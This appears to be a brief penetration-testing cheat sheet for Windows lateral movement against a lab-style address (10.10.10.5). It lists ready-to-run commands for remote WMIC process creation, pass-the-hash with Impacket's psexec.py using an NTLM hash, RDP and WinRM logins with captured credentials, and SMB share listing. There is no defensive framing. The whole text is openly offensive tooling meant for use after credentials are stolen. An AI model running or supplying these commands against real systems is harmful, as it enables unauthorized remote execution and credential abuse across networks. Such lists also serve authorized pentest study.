# Remote WMIC execution
wmic /node:10.10.10.5 process call create "cmd.exe /c whoami"

# Pass-the-Hash with Impacket
psexec.py administrator@10.10.10.5 -hashes aad3b435b51404eeaad3b435b51404ee:31337deadbeef1234567890abcdef

# Using RDP once creds are popped
xfreerdp /u:admin /p:SuperSecure123 /v:10.10.10.5

# Remote PowerShell session (WinRM)
Enter-PSSession -ComputerName 10.10.10.5 -Credential admin

# SMB-mounted share access
smbclient //10.10.10.5/share -U 'user' -c 'ls'


